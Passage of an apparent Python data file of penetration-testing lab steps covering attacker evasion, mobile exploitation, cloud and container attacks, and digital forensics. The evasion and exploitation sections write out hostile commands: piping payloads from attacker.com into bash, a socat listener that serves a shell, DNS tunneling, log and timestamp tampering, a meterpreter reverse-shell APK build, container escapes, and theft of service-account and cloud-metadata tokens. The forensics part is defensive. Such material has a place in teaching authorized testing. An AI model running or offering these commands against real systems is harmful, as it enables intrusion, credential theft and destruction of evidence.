touch -r /bin/ls /tmp/backdoor.sh
touch -d "2023-01-01 00:00:00" suspicious_file.txt

# Process hiding
kill -STOP $$ # Hide current process

# Memory-only execution
curl -s http://attacker.com/payload.sh | bash
wget -O - http://attacker.com/payload.sh | bash

# File attribute manipulation
chattr +i important_file.txt  # Make immutable
chattr +a log_file.txt        # Append only

# Rootkit installation (for educational purposes)
./rootkit_installer --stealth --hide-processes --hide-files

# Anti-forensics file deletion
shred -vfz -n 10 sensitive_file.txt
dd if=/dev/urandom of=sensitive_file.txt bs=1M count=10
rm sensitive_file.txt

# Network evasion
# Use encrypted channels
openssl s_client -connect attacker.com:443 -quiet
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork EXEC:/bin/bash

# DNS tunneling
iodine -f -c -P password tunnel.attacker.com''',
                'explanation': 'Evasion techniques help maintain access longer by avoiding detection systems and forensic analysis.'
            }
        ]
    },
    {
        'id': 'mobile-security',
        'title': 'Mobile Device Security Testing',
        'description': 'Comprehensive mobile application and device security assessment techniques',
        'difficulty': 'Advanced',
        'duration': '60 minutes',
        'category': 'Mobile Security',
        'tools': ['apktool', 'dex2jar', 'jadx', 'frida', 'objection'],
        'warning': 'Mobile security testing should only be performed on devices and applications you own or have permission to test.',
        'steps': [
            {
                'title': 'Android Application Analysis',
                'content': 'Comprehensive analysis of Android applications for security vulnerabilities.',
                'code': '''# APK reverse engineering
apktool d application.apk
unzip application.apk
dex2jar classes.dex

# Static analysis with JADX
jadx -d output_directory application.apk
jadx-gui application.apk

# Dynamic analysis setup
adb devices
adb install application.apk
adb logcat | grep -i "application_package"

# Frida dynamic instrumentation
frida-ps -U  # List processes
frida -U -l script.js com.application.package

# Certificate pinning bypass
frida -U --codeshare akabe1/frida-multiple-unpinning -f com.application.package

# Root detection bypass
frida -U --codeshare dzonerzy/fridantiroot -f com.application.package

# Network traffic analysis
mitmdump -s capture_script.py
burpsuite --project-file=mobile_test.burp''',
                'explanation': 'Android applications require both static and dynamic analysis to identify security vulnerabilities.'
            },
            {
                'title': 'iOS Application Security Testing',
                'content': 'Security assessment techniques for iOS applications and devices.',
                'code': '''# iOS application extraction (jailbroken device)
ssh root@ios_device_ip
find /var/containers/Bundle/Application -name "*.app"
scp -r root@ios_device_ip:/path/to/app.app ./

# Class-dump for Objective-C headers
class-dump -H Application.app/Application > headers.h

# Cycript dynamic analysis
cycript -p Application
[UIApplication sharedApplication]

# Keychain analysis
python keychain_dumper.py
sqlite3 /private/var/Keychains/keychain-2.db

# Binary analysis with Hopper
hopper -e Application.app/Application

# Runtime manipulation with Frida
frida -U -l ios_bypass.js Application

# SSL kill switch for certificate pinning
# Install SSL Kill Switch 2 from Cydia

# Network traffic capture
rvictl -s [UDID]  # Create virtual interface
tcpdump -i rvi0 -w ios_traffic.pcap''',
                'explanation': 'iOS security testing requires jailbroken devices and specialized tools for application analysis.'
            },
            {
                'title': 'Mobile Device Exploitation',
                'content': 'Advanced techniques for exploiting mobile devices and applications.',
                'code': '''# Android exploitation framework
msfconsole
use exploit/android/browser/webkit_navigator_getstoragearray_uxss
set RHOST android_device_ip
exploit

# Custom Android payload creation
msfvenom -p android/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -o malicious.apk

# ADB exploitation
adb connect target_device:5555
adb shell
su

# Android Debug Bridge attacks
adb backup -apk -shared -nosystem -all
dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" | tar -xvf -

# NFC exploitation
nfc-list
nfc-mfclassic r a dump.mfd mifare_card.mfd

# Bluetooth exploitation
hcitool scan
sdptool browse target_mac_address
l2ping target_mac_address

# iOS exploitation (if applicable)
# Note: iOS exploitation requires specific conditions and is highly restricted
checkra1n  # Hardware-based jailbreak tool
unc0ver   # Software-based jailbreak tool''',
                'explanation': 'Mobile exploitation techniques vary significantly between platforms and device configurations.'
            }
        ]
    },
    {
        'id': 'cloud-security',
        'title': 'Cloud Infrastructure Security Assessment',
        'description': 'Advanced techniques for testing cloud platforms, containers, and infrastructure security',
        'difficulty': 'Expert',
        'duration': '75 minutes',
        'category': 'Cloud Security',
        'tools': ['aws-cli', 'azure-cli', 'kubectl', 'docker', 'terraform'],
        'warning': 'Cloud security testing requires proper authorization and should only be performed on resources you own or have permission to test.',
        'steps': [
            {
                'title': 'AWS Security Assessment',
                'content': 'Comprehensive security testing of Amazon Web Services infrastructure.',
                'code': '''# AWS reconnaissance and enumeration
aws configure list
aws sts get-caller-identity
aws ec2 describe-instances
aws s3 ls
aws iam list-users
aws rds describe-db-instances

# S3 bucket security testing
aws s3 ls s3://target-bucket --recursive
aws s3 cp s3://target-bucket/sensitive-file.txt ./
aws s3api get-bucket-acl --bucket target-bucket
aws s3api get-bucket-policy --bucket target-bucket

# IAM privilege escalation
aws iam list-attached-user-policies --user-name target-user
aws iam get-policy-version --policy-arn arn:aws:iam::account:policy/PolicyName --version-id v1
aws sts assume-role --role-arn arn:aws:iam::account:role/RoleName --role-session-name test

# Lambda security testing
aws lambda list-functions
aws lambda get-function --function-name target-function
aws lambda invoke --function-name target-function response.json

# CloudTrail log analysis
aws logs describe-log-groups
aws logs filter-log-events --log-group-name CloudTrail/APIGateway --filter-pattern "ERROR"

# Security group analysis
aws ec2 describe-security-groups --group-ids sg-12345678
aws ec2 authorize-security-group-ingress --group-id sg-12345678 --protocol tcp --port 22 --cidr 0.0.0.0/0''',
                'explanation': 'AWS security assessment requires understanding of IAM permissions, service configurations, and logging mechanisms.'
            },
            {
                'title': 'Container Security Testing',
                'content': 'Advanced Docker and Kubernetes security assessment techniques.',
                'code': '''# Docker security analysis
docker ps -a
docker images
docker inspect container_id
docker exec -it container_id /bin/bash

# Container escape techniques
# Mount host filesystem
docker run -v /:/host -it ubuntu chroot /host bash

# Privileged container exploitation
docker run --privileged -it ubuntu bash
mount /dev/sda1 /mnt
chroot /mnt bash

# Docker daemon exploitation
docker -H tcp://target:2376 ps
docker -H tcp://target:2376 run -v /:/host -it ubuntu chroot /host bash

# Kubernetes security testing
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces
kubectl auth can-i --list

# Kubernetes privilege escalation
kubectl exec -it target-pod -- /bin/bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces

# Container image vulnerability scanning
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy image alpine:latest
clair-scanner --ip localhost alpine:latest

# Registry security testing
docker pull private-registry.com/image:tag
docker login private-registry.com
docker push malicious-image:latest''',
                'explanation': 'Container security involves testing both the container runtime and orchestration platforms like Kubernetes.'
            },
            {
                'title': 'Azure and GCP Security Testing',
                'content': 'Security assessment techniques for Microsoft Azure and Google Cloud Platform.',
                'code': '''# Azure security assessment
az login
az account show
az vm list
az storage account list
az keyvault list

# Azure Active Directory enumeration
az ad user list
az ad group list
az role assignment list
az ad app list

# Azure storage testing
az storage blob list --account-name storageaccount --container-name container
az storage blob download --account-name storageaccount --container-name container --name file.txt --file ./file.txt

# Google Cloud Platform testing
gcloud auth list
gcloud projects list
gcloud compute instances list
gcloud storage buckets list

# GCP IAM analysis
gcloud projects get-iam-policy project-id
gcloud iam roles list
gcloud iam service-accounts list

# GCP storage security
gsutil ls gs://bucket-name
gsutil cp gs://bucket-name/file.txt ./
gsutil iam get gs://bucket-name

# Cloud metadata exploitation
curl http://169.254.169.254/latest/meta-data/
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
curl -H "Metadata: true" http://169.254.169.254/metadata/identity/oauth2/token

# Terraform security analysis
terraform plan
terraform show
grep -r "password\|secret\|key" *.tf''',
                'explanation': 'Multi-cloud security requires understanding different authentication mechanisms and service configurations.'
            }
        ]
    },
    {
        'id': 'forensics-investigation',
        'title': 'Digital Forensics & Incident Response',
        'description': 'Advanced digital forensics techniques for incident response and evidence collection',
        'difficulty': 'Expert',
        'duration': '80 minutes',
        'category': 'Digital Forensics',
        'tools': ['autopsy', 'volatility', 'sleuthkit', 'binwalk', 'foremost'],
        'warning': 'Digital forensics techniques should only be used for legitimate investigations with proper legal authorization.',
        'steps': [
            {
                'title': 'Memory Forensics Analysis',
                'content': 'Advanced memory dump analysis using Volatility framework.',
                'code': '''# Memory dump acquisition
# Physical memory acquisition
dd if=/dev/mem of=memory_dump.raw bs=1M
LiME (Linux Memory Extractor) for live systems

# Volatility memory analysis
volatility -f memory_dump.raw imageinfo
volatility -f memory_dump.raw --profile=Win7SP1x64 pslist
volatility -f memory_dump.raw --profile=Win7SP1x64 pstree
volatility -f memory_dump.raw --profile=Win7SP1x64 psscan

# Network connections analysis
volatility -f memory_dump.raw --profile=Win7SP1x64 netscan
volatility -f memory_dump.raw --profile=Win7SP1x64 netstat

# Process analysis
volatility -f memory_dump.raw --profile=Win7SP1x64 dlllist -p 1234
volatility -f memory_dump.raw --profile=Win7SP1x64 handles -p 1234
volatility -f memory_dump.raw --profile=Win7SP1x64 cmdline

# Malware analysis
volatility -f memory_dump.raw --profile=Win7SP1x64 malfind
volatility -f memory_dump.raw --profile=Win7SP1x64 yarascan -Y "/path/to/rules.yar"

# Registry analysis
volatility -f memory_dump.raw --profile=Win7SP1x64 hivelist
volatility -f memory_dump.raw --profile=Win7SP1x64 printkey -K "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

# File extraction
volatility -f memory_dump.raw --profile=Win7SP1x64 filescan
volatility -f memory_dump.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 -D ./output/''',
                'explanation': 'Memory forensics provides insights into running processes and system state at the time of acquisition.'
            },
            {
                'title': 'Disk Forensics and File Recovery',
                'content': 'Comprehensive disk analysis and file recovery techniques.',
                'code': '''# Disk imaging and acquisition
dd if=/dev/sda of=disk_image.dd bs=4096 conv=noerror,sync
dcfldd if=/dev/sda of=disk_image.dd hash=sha256 hashlog=hash.log

# Disk analysis with Sleuth Kit
mmls disk_image.dd
fsstat -o 2048 disk_image.dd
fls -o 2048 disk_image.dd

# Timeline creation
fls -r -m / disk_image.dd > timeline.body
mactime -b timeline.body -d -z UTC > timeline.csv

# File recovery
foremost -i disk_image.dd -o recovered_files/
scalpel disk_image.dd -o carved_files/
photorec disk_image.dd

# Deleted file analysis
istat -o 2048 disk_image.dd 12345
icat -o 2048 disk_image.dd 12345 > recovered_file.txt
tsk_recover -i disk_image.dd -o recovered_files/

# Autopsy GUI analysis
autopsy &
# Create new case and add disk image as data source

# File signature analysis
binwalk disk_image.dd
binwalk -e suspicious_file.bin
strings disk_image.dd | grep -i password

# Hash analysis
md5deep -r /evidence/directory > hash_values.txt
hashdeep -c sha256 -r /evidence/directory

# Registry analysis (Windows)
regripper -r SOFTWARE -p all > software_analysis.txt
rip.pl -r SYSTEM -p compname''',
                'explanation': 'Disk forensics involves creating forensic images and analyzing file systems for evidence and recovered data.'
            },
            {
                'title': 'Network Forensics and Log Analysis',
                'content': 'Advanced network traffic analysis and log correlation techniques.',
                'code': '''# Network traffic capture and analysis
tcpdump -i eth0 -w capture.pcap host 192.168.1.100
tshark -r capture.pcap -Y "http.request"
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name

# Wireshark analysis
wireshark capture.pcap &
# Use filters: ip.addr == 192.168.1.100 && http

# Network forensics with NetworkMiner
mono /opt/NetworkMiner/NetworkMiner.exe

# Log analysis techniques
# Apache log analysis
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr
grep -E "POST|PUT|DELETE" /var/log/apache2/access.log

# System log analysis
journalctl --since "2024-01-01" --until "2024-01-02"
grep -i "failed\|error\|denied" /var/log/auth.log
last -f /var/log/wtmp
lastlog

# Windows Event Log analysis (using python-evtx)
python evtx_dump.py System.evtx > system_events.xml
grep -i "logon\|failed" system_events.xml

# SIEM correlation
# ELK Stack log analysis
curl -X GET "localhost:9200/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "range": {
      "@timestamp": {
        "gte": "2024-01-01",
        "lte": "2024-01-02"
      }
    }
  }
}'

# Splunk search queries
index=security sourcetype=apache_access | stats count by clientip | sort -count''',
                'explanation': 'Network forensics and log analysis help reconstruct events and identify attack patterns across systems.'
            }
        ]
    }
]
